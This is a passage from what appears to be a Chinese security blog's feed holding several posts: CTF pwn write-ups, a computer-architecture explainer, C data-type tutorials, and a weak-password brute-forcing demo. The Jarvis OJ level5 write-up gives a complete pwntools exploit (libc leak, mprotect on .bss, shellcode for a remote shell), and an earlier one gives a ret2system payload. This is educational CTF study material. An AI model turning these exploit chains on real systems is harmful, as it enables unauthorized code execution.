0x02 姿势二 第二种姿势和第一种差不多，只不过是自己构造shell，需要我们自己查找字符串/bin/sh的地址，如下： 12345# ROPgadget --binary ymjr --string &quot;/bin/sh&quot;Strings information============================================================0x08048763 : /bin/sh exp如下： 1234567891011121314151617from pwn import *r = remote("221.228.109.254",10002)context(log_level="debug")elf = ELF("./ymjr")system_addr = elf.symbols["system"]bin_sh_addr = 0x08048763# 把返回地址中填充secure_addr地址payload = b'a'*108 # v4空间的填充payload += b'a'*4 # old ebp的填充payload += p32(system_addr) # 返回地址填充为secure的地址payload += b'a'*4 # system函数的返回地址，我们并不管执行system函数以后的返回地址payload += p32(bin_sh_addr) # system函数的参数/bin/sh的地址r.sendlineafter("There is something amazing here, do you know anything?",payload)r.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>看雪CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【科普】冯·诺依曼结构与具体实现]]></title>
    <url>%2F2020%2F07%2F03%2F2020.07.03%EF%BC%88133%EF%BC%89%2F</url>
    <content type="text"><![CDATA[1.冯·诺依曼计算的主要构成 冯·诺依曼计算机主要是由五大部分构成： 运算器（CA）：Central Arithmetical 控制器（CC）：Central Contral 存储器（M）：Memory 输入设备（I）：Input 输出设备（O）：Output 除了上述五部分，还有一个外部记录介质 R(outside Recording medium)，示意图如下： 下面我们就来看看和具体实现是如何对应的呢？ 2.冯·诺依曼结构原理与实现的对应 如上图，它们一一对应关系如下： CPU ⇢ 运算器 CA和控制器 CC 主存 ⇢ 存储器 M 键盘 ⇢ 输入设备 I 硬盘、显示器 ⇢ 输出设备 在这里要说明的是主板上的北桥、南桥和BIOS三个部件 北桥 1在主板上，CPU是如何获取指令并去执行的呢？上图的主板上采取了南北桥结构，CPU对外会连接一块芯片北桥，CPU想要访问主存，就必须通过北桥芯片。 南桥 1在北桥下方有一块芯片，叫做南桥，南桥内部集成了很多输入输出设备的控制器，其中就包括硬盘的控制器，也就是说硬盘实际上就是和南桥相连的。 BIOS 123要注意，计算机刚启动时，主存中是没有信息的，因为断电后主存的信息都会丢失，这是RAM的一个特性，那么系统启动以后，CPU从什么地方获取指令呢？是否是从硬盘中取得呢？不是的，因为从硬盘访问数据相对比较复杂，那么实际上在主板上还有一个很小的芯片，它与南桥相连，一般称之为BIOS（Base Input Output System）芯片，该芯片存储容量很小，会保存一段比较简单但是比较重要的程序，包括检查主板上都有哪些设备，并且检查这些设备是否工作正常，这个芯片实际上是一个只读存储器（ROM），当断电后BIOS芯片中的数据是不会丢失的，但是从冯·诺依曼结构上来看，它并不属于存储器的范畴，而是和硬盘一样属于外部记录介质R，所以当计算机启动后，CPU会一次通过北桥 -&gt; 南桥，访问到BIOS芯片，从中取得指令。CPU从BIOS芯片中取得指令后，会依次检查主板上的各个设备，包括是否有显卡，通过显卡连接显示器，检查键盘的存在 目前显卡的功能越来越复杂，性能也越来越强大，尤其是其中的图形处理单元（GPU），GPU往往也可以进行复杂的数学计算，拥有很强的运算能力，有时候也让GPU承担一些运算的工作，实际上在高性能的运算中会采用大量的GPU来进行运算，从这个意义上将GPU也承担了运算器和控制器的一些功能。而南北桥也在迅速的发生变化。 3.南北桥架构的演变 演变（1） 上图还是刚才的主板。我们先来看图中右侧部分，最上方是CPU，其中往往包含很多CPU核；向下CPU连接的是北桥，北桥中主要有主存控制器—对外连接主存，现在的显卡一般采用PCIe接口，所以在北桥中有一个PCIe控制器，对外通过PCIe插槽连接PCIe显卡，当然对显存的要求不高，可以通过北桥的集成显卡直接连接显示器；北桥还连接着南桥，南桥中集中了大多数I/O设备的控制器。 下面再来看左侧部分，红色箭头部分表示传输压力很大，而绿色部分表示传输压力较小，在这种情况下，最主要解决对性能影响最大的关键问题，就是CPU访问主存的通道，所以在南北桥上发生的第一个变化如下。 演变（2） 如上图，在南北桥上发生的第一个变化，就是北桥的主控制器被移到了CPU芯片中，从图中可以看到，CPU卡槽离主存卡槽更近，这是因为现在CPU是直接访问主存的，而不需要再通过访问北桥了，这样大大提高了数据传输率，现在显示的通道就成为了要解决的下一个问题。 演变（3） 如上图，在最新的个人计算机的CPU设计中，不仅包含了主存控制器，还包含了PCIe控制器，在外部可以直接连接显卡，这样北桥的的重要部件都被集成到了CPU中，那么北桥就没有存在的必要了，于是将北桥剩余的一些功能整合到南桥中，那么所谓南北桥架构已经消失了，由于没有北桥，那么南桥的名字也显得奇怪了，所以往往有一些不同的名字，比如PCH等。这样就将大部分通过主板连接的线路，集成到了CPU内部，这样就大大的提升了系统的性能。 演变（4） 什么是系统芯片呢？系统芯片就是将计算机或其他电子系统集成为单一芯片的集成电路，这种芯片在智能手机、平板电脑等移动计算设备上得到了广泛应用。下面要提的是一个著名定理摩尔定律 4.摩尔定律 摩尔定律原型 1965年，摩尔在《电子学》杂志上预测：在最低元件价格下，集成电路的复杂度每年大约增加一倍，这一增长率至少可以维持十年。这就是摩尔定律的原型。但是于1967年，摩尔调整了预测，在最低元件价格下，集成电路的复杂度每两年增加一倍，这一增长率至少可以维持十年。 现在摩尔定律的描述 现在摩尔定律常被描述为：当价格不变时，集成电路上可容纳的晶体管数目，约每隔18个月便会增加一倍，性能也将提升一倍。]]></content>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【web安全】爆破用户登录弱口令]]></title>
    <url>%2F2020%2F07%2F01%2F2020.07.01%EF%BC%88132%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前一段时间一直在做pwn方向的题目，以后的要开始同时兼顾，为准备打各种CTF比赛做准备，同时也是提升自己的安全知识能力和技术。今天就用一道简单的web题目来引出该主题，大家一般在设置密码时，为了方便，有的人就随便设置密码比如123456789、88888888等，大家也许知道这样的密码是不安全的，但是并不清楚为什么不安全。今天我就带着大家的疑问，来和大家讲一下弱口令为什么不安全的。 情景假设 加入小明自己写了一个登陆系统，如下图，他在设置管理员密码时，随便输入一串字符串。这里我们并不知道这个密码是多少，下面看一下我们是否能登录该系统。 1.创建字典 情境中给出了说明：随便输了一串字符串。那我们先假设这段字符串很简单，我们根据人们常用的密码创建一个密码字典，以备我们后面使用，字典部分内容如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253123456789a123456123456a1234567891234567890woaini1314qq123456abc123456123456a123456789a147258369zxcvbnm98765432112345678910abc123qq123456789123456789.7708801314520woaini5201314520q123456123456abc1233211234567123123123123456.0123456789asd123456aa123456135792468q123456789abcd12345612345678900woaini520woaini123zxcvbnm1231111111111111111w123456aini1314abc123456789111111woaini521qwertyuiop13145205201234567891qwe123456asd12300000014725836901357924680789456123123456789abcz1234561234567899 2.爆破密码 在这里我们要用到一个抓包工具Burp Suit（666666），它长下面这个样子： 下面我用动图R的形式来展示一下爆破的整个过程： 可以从上图中看出，管理员密码为123456，所以说通过这个简单的例子可以看出，我们平常在设置密码时尽量不要用弱口令，尽量使用字母、数字和符号的混合字符串，以保证我们账户的安全性。]]></content>
      <tags>
        <tag>web</tag>
        <tag>XCTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【C语言学习系列二】 C语言中的基本数据类型]]></title>
    <url>%2F2020%2F06%2F26%2F2020.06.24%EF%BC%88131%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 基本数据类型 基本类型 字节 范围 char 1byte — short 2bytes 0~32767(0~0x7fff)-32768~-1(0x8000~0xffff) int 4bytes 0~2147483647(0~0x7fffffff)-2147483648~-1(0x80000000~0xffffffff) unsigned int 4bytes 0~4294967295(0~0xffffffff) long int 8bytes 正: 0~0x7fffffffffffffff负: 0x8000000000000000~0xffffffffffffffff unsigned long int 8bytes 0~0xffffffffffffffff float 4bytes |3.4e-38|~|3.4e+38| double 8bytes |1.7e-308|~|1.7e+308| 下面我们用一个示例代码打印一下这些基本的数据类型，代码如下： 12345678910111213// Function: 打印基本数据类型的字节数#include&lt;stdio.h&gt;int main()&#123; int i = 0; printf("The size of char is %d bytes\n",sizeof(char)); printf("The size of short is %d bytes\n",sizeof(short)); printf("The size of int is %d bytes\n",sizeof(int)); printf("The size of long int is %d bytes\n",sizeof(long int)); printf("The size of float is %d bytes\n",sizeof(float)); printf("The size of double is %d bytes\n",sizeof(double)); return 0;&#125; 运行结果如下： 123456The size of char is 1 bytesThe size of short is 2 bytesThe size of int is 4 bytesThe size of long int is 4 bytesThe size of float is 4 bytesThe size of double is 8 bytes 需要说明的是上述程序的运行环境为32位，所以long的字节数是4bytes，而在64位环境下则为8bytes 1.有符号和无符号 对于有符号和无符号数据类型这块，我想首先用一个问题来引出这部分的重点内容——计算机怎么知道数值是有符号的还是无符号的呢？众所周知，数值在计算机内部的存储方式是以0 1方式进行存储的，比如数值4在16位环境下的存储形式为0000 0000 0000 0100，很简单就能知道这是一个正数4，那么如果存储的是-4呢？（大家思考一下负数在内存的存储方式），要知道-4在内存是以它的补码形式进行存储的，首先来看-4从原码到补码的转变：1 000 0100 （原码）⇥ 1 111 1011（反码）⇥ 1 111 1100 （补码），那么-4在内存的存储形式为0xfc，下面我们可以看一下32位环境下的无符号和有符号定义下-4和4的存储形式，是否和我们推导的一致呢？如下图： 从上图可以看出对于有符号数值是以数值的补码形式进行存储的，但是对于无符号下的负数是什么原因呢？这是因为你前面加上符号之后，相当于把变量提升为有符号类型，所以和正常的有符号下的存储是一样的。 知识点一：无论是整数和负数，在计算机内部都是以它们的补码的形式进行存储的。 这里通过一个简单的程序引出下面的问题，程序如下： 123456789101112#include&lt;stdio.h&gt;int main()&#123; unsigned int i = 2147483649, usum; int j = 1, sum; usum = i + j; sum = i + j; printf("usum = 214783649 + 1 = %d (d)\n",usum); printf("usum = 214783649 + 1 = %u (u)\n",usum); printf("sum = 214783649 + 1 = %d (d)\n",sum); printf("sum = 214783649 + 1 = %u (u)\n",sum);&#125; 在看下方结果之前，大家先思考一下应该是什么结果？ 1234usum = 214783649 + 1 = -2147483646 (d)usum = 214783649 + 1 = 2147483650 (u)sum = 214783649 + 1 = -2147483646 (d)sum = 214783649 + 1 = 2147483650 (u) 看到上面的输出结果，我猜大家可能会有这样的问题： i和j都是正数，两个数相加之后怎么成负数了？ 为什么格式符不同，输出的结果也不通呢？ usum是unsigned int类型，怎么成为了负数呢？ 下面我们一步一步的来进行解析。 首先我们知道了数值在机器内存是以补码的形式进行存储的，那么对于两个数相加机器是怎么处理的呢？在汇编层次，一般通过add eax,edx进行的，其中将eax和edx中的二进制相加，然后把结果存储到寄存器eax中，所以说214783649 + 1对于机器来说只不过是将这两个的二进制形式相加而已，关于补码加减运算应该要注意的是：负数的求反码和补码过程符号位是不参与计算的，要取出来，只有在进行负数补码的加减法的时候符号位才参与计算[1] 1234 214783649 1000 0000 0000 0000 0000 0000 0000 0001+ 1 +0000 0000 0000 0000 0000 0000 0000 0001------------- ----------------------------------------- ? &lt;= 1000 0000 0000 0000 0000 0000 0000 0010 关键的要来了，机器会把1000 0000 0000 0000 0000 0000 0000 0010看做什么呢？ 如果是有符号的话，则它的原码为1111 1111 1111 1111 1111 1111 1111 1100，因为是有符号的，所以最高位为符号位，为1表示是负数，那么1111111111111111111111111111110(去掉符号位的二进制)的十进制为2147483646，再加上符号，那么就是-2147483646 如果是无符号的话，则它的原码就是其本身，那么该二进制的十进制为2147483650 之所以出现上述结果，原因在于格式符%d和%u： %d是输出带符号十进制定点格式，也就是说机器通过%d将本无意义的二进制看作有符号的数值，那么第一位是符号位； %u是输出无符号十进制定点格式，也就是说不管前面是如何定义的，在这里的输出机器就把二进制串解析成无符号的十进制； 小节总结： 数值在内存中都以补码的形式进行存储和计算；(为什么要以补码的形式呢，见参考文献[1]) 数值是有符号还是无符号，看用户怎么使用 2.浮点数在内存的存储形式 首先要说明的是，这里我们不会对浮点数的具体知识点展开，比如精度问题。我们知道了整型数值在内存中是以其补码的形式进行存储的，那浮点数在内存中是以什么形式进行存储的呢？既然不太清楚，那我们就先用一个简单的例子来看一下浮点数的存储方式： 1234567#include&lt;stdio.h&gt;int main()&#123; float a = 4.5; // 二进制形式为0000 0000 0000 0000 0000 0000 0000 0100.1 float b = -4.5; // 二进制形式为1000 0000 0000 0000 0000 0000 0000 0100.1 printf("[*] a:%f\n[*] b:%f\n",a,b); return 0;&#125; 我们将其程序编译为32位的ELF程序，用GDB看一下ａ和ｂ的存储形式，如下： 我们现在对比一下a和b的二进制形式和在计算机内存存放的形式： 123 a b 数值自身形式： 00000000000000000000000000000100.1 10000000000000000000000000000100.1 内存中的存储： 01000000100100000000000000000000 11000000100100000000000000000000 可以看出数值本身的二进制形式和存放在内存中的形式完全不同，这是因为浮点数与整数的存储方式完全不同，根据IEEE-754标准，我们可以知道浮点数是以如下方式进行存储的： 既然我们知道了相关的存储方式[2]，那么机器如何操作的呢？下面我们还是一上面的程序为例，看一下相关的汇编代码： 12345678910 …… 0x565561b0 &lt;+23&gt;: add eax,0x2e50 0x565561b5 &lt;+28&gt;: fld DWORD PTR [eax-0x1fe4]=&gt; 0x565561bb &lt;+34&gt;: fstp DWORD PTR [ebp-0xc] 0x565561be &lt;+37&gt;: fld DWORD PTR [eax-0x1fe0] 0x565561c4 &lt;+43&gt;: fstp DWORD PTR [ebp-0x10] 0x565561c7 &lt;+46&gt;: fld DWORD PTR [ebp-0xc] 0x565561ca &lt;+49&gt;: fld DWORD PTR [ebp-0x10] 0x565561cd &lt;+52&gt;: sub esp,0xc …… 这里的fld、fstp指令是没有接触过，那么这里就简单介绍一下： fld指令 指令格式：FLD STReg/MemReal （STReg是处理器堆栈寄存器ST(0)~ST(7)） 指令功能：将浮点数据压入协处理器的堆栈中。当进行内存单元内容压栈时，系统会自动决定传送数据的精度。比如：用DD或REAL4定义的内存单元数值是单精度数等，类似于指令push fst指令： 指令格式：FST STReg/MemReal 指令功能：将协处理器堆栈栈顶的数据传送到目标操作数中。在进行数据传送时，系统自动根据控制寄存器中舍入控制位的设置把栈顶浮点数舍入成相应精度的数据。 fstp指令 指令格式：FSTP STReg/MemReal 指令功能：与FST相类似，所不同的是：指令FST执行完后，不进行堆栈的弹出操作，即：堆栈不发生变化，而指令FSTP执行完后，则需要进行堆栈的弹出操作，堆栈将发生变化。 0x01 数据常量 1.字符和字符字面值 从一个程序开始我们的学习： 1234567891011121314#include&lt;stdio.h&gt;int main()&#123; int a = 'a'; char b = 'b'; char c = 0x63; int d = 100; printf("[*] a = %d(d) = %c(c)\n",a,a); printf("[*] b = %d(d) = %c(c)\n",b,b); printf("[*] c = %d(d) = %c(c)\n",c,c); printf("[*] d = %d(d) = %c(c)\n",d,d); b--; printf("[*] b-1 = %d(d) = %c(c)\n",b,b);&#125; 结果如下 12345[*] a = 97(d) = a(c)[*] b = 98(d) = b(c)[*] c = 99(d) = c(c)[*] d = 100(d) = d(c)[*] b-1 = 97(d) = a(c) 字面值就是一种记号而已，比如3，100，a,c，3.14。因为我们不能修改它（你能说把3改成5吗？）所以有时候又叫它常量。比如 int a = 100；a是一个int型变量，100就是一个字面值。字面值100只能用来作右值，不能作左值。 C语言中字符字面值是由一对单引号括起来的单个字符，比如’a’、‘b’。实际上字符字面值和整型字面值是一样的。编译器把字符字面值都当做整型字面值处理。比如： 定义一个字符变量并用字符字面值来初始化：char ch = ‘a’；或者 char ch = 0x61； 定义一个int型变量并用字符字面值来初始化：int a = ‘a’；也是可以的，printf(&quot;%d&quot;,a);输出结果为97 总结 字符型可以和整型可以相互转化，在C语言中字符型就是一种整型，因为在内存中存储的是二进制形式，可以被解析成字符和字符字面值两个含义； 字符字面值是由单引号括起来的单个字符； 0x02 数据类型转换 1.类型提升 首先举一个简单的例子： 1234567891011121314#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; short a= -1; unsigned short b; unsigned int c; b = a; c = a; printf("[*] short a = %d(d) = %u(u)\n",a,a); printf("[*] unsigned short b = %d(d) = %u(u)\n",b,b); printf("[*] unsigned int c = %d(d) = %u(u)\n",c,b); return 0;&#125; 结果如下： 123[*] short a = -1(d) = 4294967295(u)[*] unsigned short b = 65535(d) = 65535(u)[*] unsigned int c = -1(d) = 4294967295(u) 分析printf的输出，如下图： 总结 有符号数按照有符号数的扩展规则（高位补符号位）扩展，无符号数按照无符号数的扩展规则（高位补0）扩展 整型提升都解释为int 2.类型降格 关于类型降格的相关知识点我只简单总结一下，大家可以自己写示例代码进行验证 当实数（浮点数）转换为整数时，实数的小数部分被全被舍去，只保留整数部分 当double类型转换为float类型，将去掉多余的数字，但按照四舍五入进行处理，这种会降低精度 3.显示转换 显示转换的方法有：强制类型转换 4.隐式转换 隐式转换的方法有： 赋值转换 通过赋值语句使符号右边表达式的值的类型自动转换为其左边变量的类型，如我们在类型提升中程序里面有关赋值的语句，如 1234567#include&lt;stdio.h&gt;int main()&#123; int a = 3,b; short i = 4,j; j = a; // int =&gt; short 类型降格 b = i; // short =&gt; int 类型提升&#125; 一元转换 将短型数扩展成机器处理的长度 二元转换 按照优先级顺序将各二元运算符的操作数提升为同一类型，长类型的优先级大于短类型的优先级 输出转换 比如我们前面讲到的printf()的格式符%d，是将数据类型提升/降格为signed int类型 0x04 Reference [1] 计算机补码运算背后的数学原理是什么？ [2] 浮点数的二进制表示]]></content>
      <tags>
        <tag>基础知识</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【C语言学习系列一】 重新认识 C 语言]]></title>
    <url>%2F2020%2F06%2F22%2F2020.06.22%EF%BC%88130%EF%BC%89%2F</url>
    <content type="text"><![CDATA[1.C语言的历史 贝尔实验室的Dennis Ritchie（1941－2011年）为了给在PDP-11电脑上运行的Unix系统设计出一个系统级的编程语言，他在B语言的基础上创造了C语言，这是一门高级编程语言。 1969-1973年：早期的C语言 1969年：基于 BCPL 创建 B ，以作为 Unix 的系统程序语言替代 PDP-7 汇编器 1971年：于将 B 移植到PDP-11 时创建 NB （新“ B ”），也就是C语言的前身 1972年：语言更名为 C 1973年：Unix操作系统的核心正式用C语言改写，这是C语言第一次应用在操作系统的核心编写上 C语言源于BCPL语言，后者由马丁·理察德（Martin Richards）于1967年左右设计实现。BCPL是一门&quot;无类型&quot;的编程语言：它仅能操作一种数据类型，即机器字（machine word）。1970年，肯·汤普逊为运行在PDP-7上的首个Unix系统设计了一个精简版的BCPL，这个语言被称为B语言，它也是无类型的。 Unix最早运行在PDP-7上，是以汇编语言写成，在PDP-11出现后，丹尼斯·里奇与肯·汤普逊着手将Unix移植到PDP-11上，无类型的语言在PDP-11上愈发显得不合适。PDP-11提供了多种不同规格大小的基本对象：一字节长的字符，两字节长的整型数以及四字节长的浮点数。B语言无法处理这些不同规格大小的对象，也没有提供单独的操作符去操作它们。 C语言最初尝试通过向B语言中增加数据类型的想法来处理那些不同类型的数据。和大多数语言一样，在C中，每个对象都有一个类型以及一个值；类型决定了可用于值的操作的含义，以及对象占用的存储空间大小。 1973年，Unix操作系统的核心正式用C语言改写，这是C语言第一次应用在操作系统的核心编写上。 1974-至今：标准的C 1975年：C语言开始移植到其他机器上使用 1978年：丹尼斯·里奇和布莱恩·柯林汉合作出版了《C程序设计语言》( The C Programming Language )的第一版 下面给出一个C语言的发展时间轴： 1954年-Fortran：是世界上第一个被正式采用并流传至今的高级编程语言，由IBM开发完成 1958年-IAL(ALGOL)：ALGOL被设计用来避免FORTRAN中一些已知的问题，最终引领了许多其它编程语言的兴起，包括PL/I、Simula、BCPL、B、Pascal及C 1958年-ALGOL58：由IAL（国际代数语言，International Algebraic Language）改名而来。ALGOL家族的第一个成员。它在1958年问世，ALGOL 60即是它的基础上开发而成 1960年-ALGOL60：ALGOF60是一种面向问题的高级语言，它离硬件比较远，不宜用来编写系统程序。 1963年-CPL：CPL是1963年剑桥大学发明的，CPL语言在ALGOL 60的基础上更接近硬件一些，但规模比较大，难以实现 1967年-BCPL：是一种计算机程序设计语言，源自更早的CPL语言，1966年由剑桥大学的马丁·理察德所发展出来的。Richards试着移除了CPL中最复杂的组成，第一支BCPL compiler在IBM 7094电脑中完成 1969年-B：贝尔实验室的Ken Thompson（肯·汤普森） 对BCPL又做了改进，设计出了简单的且接近硬件的B语言，并用B语言写了第一个UNIX OS。 1971年-C：贝尔实验室的另外一个人Dennis MacAlistair Ritchie（D.M.Ritchie - DM里奇）在B的基础上设计出了C语言。C 保持了B的优点（精炼、接近硬件），又克服了他的缺点（过于简单，数据无类型），至此C语言渐渐发展成为目前世界上最常用的编程语言之一。 2.重新学习C语言的理由 接触C语言是在大一上学期，这也是我第一次接触编程，那个时候对C语言的学习可真谓云里雾里，对于C语言中一些知识点不能够很好的知道其原理，比如一个程序的变量被存放在哪里了？指针到底是个什么东西？等等一系列问题，导致在学习过程中可谓困难重重，对计算机慢慢产生了畏难情绪。在经过一段时间的学习，我认为在学习C语言之前更应该先去学习计算机中的一些理念和想法，比如可执行文件的加载过程；程序是如何被运行的；在程序运行过程中，栈扮演了什么样的角色？等等，所以在简单的了解了这些原理以后，我决定再来重新学习C语言，以便彻底的了解其整个运行机制和原理。 我参考的书籍有：《C语言程序设计语言》(第2版)和《C语言程序设计教程》(第3版) 3.学习计划 现在计划10期将C语言学完，每一期的计划如下： 第一期：数据类型 第二期：流程控制 第三期：函数和程序结构 第四期：数组 第五期：指针（上） 第六期：指针（下） 第七期：结构（体） 第八期：链表 第九期：文件 第十期：总结]]></content>
      <tags>
        <tag>基础知识</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【Jarvis OJ-PWN】level5（x64下的栈溢出漏洞）]]></title>
    <url>%2F2020%2F06%2F20%2F2020.06.20%EF%BC%88129%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 相关知识 1.mprotect()函数 mprotect()函数可以修改调用进程内存页的保护属性。如果调用进程尝试以违反保护属性的方式访问该内存，则内核会发出一个SIGSEGV信号给该进程。 函数原型：int mprotect(const void *start, size_t len, int prot) 参数解释： start：需改写属性的内存中开始地址 len：需改写属性的内存长度 prot：需要修改为的指定值 功能： mprotect()函数可以用来修改一段指定内存区域的保护属性。 他把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。 prot可以取以下几个值，并且可以用“|”将几个属性合起来使用： 1）PROT_READ：表示内存段内的内容可写； 2）PROT_WRITE：表示内存段内的内容可读； 3）PROT_EXEC：表示内存段中的内容可执行； 4）PROT_NONE：表示内存段中的内容根本没法访问。 注意：指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。 prot=7 是可读可写可执行 2.&lt;_libc_csu_init&gt;通用gadget 详情可以看一下我前面写过的一篇博文 0x01 题目分析 12# file level3_x64 level3_x64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f01f8fd41061f9dafb9399e723eb52d249a9b34d, not stripped 该文件是一个64位的ELF可执行文件 1234567# checksec level3_x64 [*] &apos;/root/Documents/CTF/PWN/Jarvis OJ/pwn/level5/level3_x64&apos; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 只开启了栈不可执行保护，下面看一下伪代码 从上面的伪代码中很容易看出vul()函数存在着栈溢出漏洞，buf能输入的值要远远大于被分配的值，所以漏洞点在这。但是由于system()函数和execve()函数被禁用了，也就是说我们无法通过这两个函数执行shellcode，那么题目给了提示请尝试使用mmap和mprotect完成本题。，对于mmap函数还不太了解，所以在这里我们使用mprotect()函数，该函数可以修改调用进程内存页的保护属性，那么我们以将我们的shellcode放入.bss段中，然后将.bss段的权限修改为可执行，然后再跳转到.bss段执行shellcode，那么下面我们怎么将shellcode写入.bss段中呢？ 1.将mprotect的地址和shellcode写入.bss段中 我们可以利用read函数将shellcode写入.bss段中，之所以也将mprotect函数的地址也写入.bss段中，是因为通用gadget中的callq *(%r12,%rbx,8)，如果rbx为0，那么这里就是将r12中表示的地址的值作为函数地址，比如r12 = 1，而地址1中的值为2，那么就是调用地址2中的函数，这一点需要注意 2.使用mprotect()函数修改.bss段的权限 第一个参数start是.bss的起始地址，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。 3.执行shellcode 0x02 解题步骤 1.泄露write的真实地址 123456789101112131415161718192021222324252627#! python3#! /usr/bin/env python#! coding: utf-8from pwn import *from LibcSearcher import *r = remote("pwn2.jarvisoj.com",9884)context(log_level="debug")elf = ELF("./level3_x64")write_plt = elf.symbols["write"]write_got = elf.got["write"]read_got = elf.got['read']main = elf.symbols["main"]bss = elf.bss()pop_rdi = 0x4006b3pop_rsi_r15 = 0x4006b1# leak write real address payload1 = bytes(0x88 * "a",encoding="unicode_escape")payload1 += p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(1)payload1 += p64(write_plt) + p64(main)print("[*] +-+-+-+-+-+-+-+- sending payload1 -+-+-+-+-+-+-+-+ [*]")r.recvuntil("Input:\n")r.sendline(payload1)write_addr = u64(r.recv()[:8])print("[+] write real addr:",hex(write_addr))print("[*] +-+-+-+-+-+-+-+- Congratulation! You haved leaked the address of write -+-+-+-+-+-+-+-+ [*]") 发送完payload1后，栈中的情况如下： 2.找出mprotect真实地址 12345# get mprotect address libc = LibcSearcher("write",write_addr)libc_base = write_addr - libc.dump("write")mprotect = libc_base + libc.dump("mprotect")print("[+] mprotect address:",mprotect) 3.将mprotect函数地址和shellcode写入bss 123456789101112131415# rop1 and rop2rop1 = 0x4006aarop2 = 0x400690# write shellcode to bssshellcode = p64(mprotect) + asm(shellcraft.amd64.sh(),arch="amd64")payload2 = bytes(0x88*"a",encoding="unicode_escape") + p64(rop1) payload2 += p64(0) + p64(1) + p64(read_got)payload2 += p64(0x600000) + p64(bss) + p64(0)payload2 += p64(rop2) + bytes("a"*56,encoding="unicode_escape") + p64(main)pause()r.sendline(payload2)r.sendline(shellcode)print("[*] +-+-+-+-+-+-+-+- sending payload2 -+-+-+-+-+-+-+-+-+ [*]") 发送完payload2后，栈中的情况如下： 4.将bss的权限改为可执行，并返回shellcode 12345678# mprotect bss 7payload3 = bytes(0x88*"a",encoding="unicode_escape") + p64(rop1)payload3 += p64(0) + p64(1) + p64(bss)payload3 += p64(7) + p64(0x1000) + p64(0x600000)payload3 += p64(rop2) + bytes("a"*56,encoding="unicode_escape") + p64(bss+8)pause()r.sendlineafter("Input:\n",payload3)r.interactive() 发送完payload3后，栈中的情况如下： 完整的exp如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#! python3#! /usr/bin/env python#! coding: utf-8from pwn import *from LibcSearcher import *r = remote("pwn2.jarvisoj.com",9884)context(log_level="debug")elf = ELF("./level3_x64")write_plt = elf.symbols["write"]write_got = elf.got["write"]read_got = elf.got['read']main = elf.symbols["main"]bss = elf.bss()pop_rdi = 0x4006b3pop_rsi_r15 = 0x4006b1# leak write real address payload1 = bytes(0x88 * "a",encoding="unicode_escape")payload1 += p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(1)payload1 += p64(write_plt) + p64(main)print("[*] +-+-+-+-+-+-+-+- sending payload1 -+-+-+-+-+-+-+-+ [*]")r.recvuntil("Input:\n")r.sendline(payload1)write_addr = u64(r.recv()[:8])print("[+] write real addr:",hex(write_addr))print("[*] +-+-+-+-+-+-+-+- Congratulation! You haved leaked the address of write -+-+-+-+-+-+-+-+ [*]")# get mprotect address libc = LibcSearcher("write",write_addr)libc_base = write_addr - libc.dump("write")mprotect = libc_base + libc.dump("mprotect")print("[+] mprotect address:",mprotect)# rop1 and rop2rop1 = 0x4006aarop2 = 0x400690# write shellcode to bssshellcode = p64(mprotect) + asm(shellcraft.amd64.sh(),arch="amd64")payload2 = bytes(0x88*"a",encoding="unicode_escape") + p64(rop1) payload2 += p64(0) + p64(1) + p64(read_got)payload2 += p64(0x600000) + p64(bss) + p64(0)payload2 += p64(rop2) + bytes("a"*56,encoding="unicode_escape") + p64(main)pause()r.sendline(payload2)r.sendline(shellcode)print("[*] +-+-+-+-+-+-+-+- sending payload2 -+-+-+-+-+-+-+-+-+ [*]")# mprotect bss 7payload3 = bytes(0x88*"a",encoding="unicode_escape") + p64(rop1)payload3 += p64(0) + p64(1) + p64(bss)payload3 += p64(7) + p64(0x1000) + p64(0x600000)payload3 += p64(rop2) + bytes("a"*56,encoding="unicode_escape") + p64(bss+8)pause()r.sendlineafter("Input:\n",payload3)r.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>Jarvis</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中的“通用gadget”]]></title>
    <url>%2F2020%2F06%2F17%2F2020.06.17%EF%BC%88128%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 基础知识 1.x86和x64的传参方式 由于X64和X86的传参的方式不同：X86是将参数入栈进行传参，X64则是将前6位参数分别通过寄存器rdi、rsi、rdx、rcx、r8和r9进行传递，之后的参数才是通过入栈的形式进行传参，下面通过一个示例程序进行描述，程序如下： 12345678910# include &lt;stdio.h&gt;void fun(int a, int b, int c, int d, int e, int f, int g ,int h ,int i)&#123; printf("a:%d\tb:%d\tc:%d\td:%d\te:%d\tf:%d\tg:%d\th:%d\ti:%d\t",a,b,c,d,e,f,g,h,i);&#125;int main()&#123; int a=100,b=101,c=102,d=103,e=104,f=105,g=106,h=107,i=108; # 十六进制分别为0x64、0x65、0x66、0x67、0x68、0x69、0x6a、0x6b、0x6c、 fun(a,b,c,d,e,f,g,h,i); return 0;&#125; x86的传参情况 从上图可以看出在x86下fun函数的参数是通过入栈的形式进行传递的 x64的传参情况 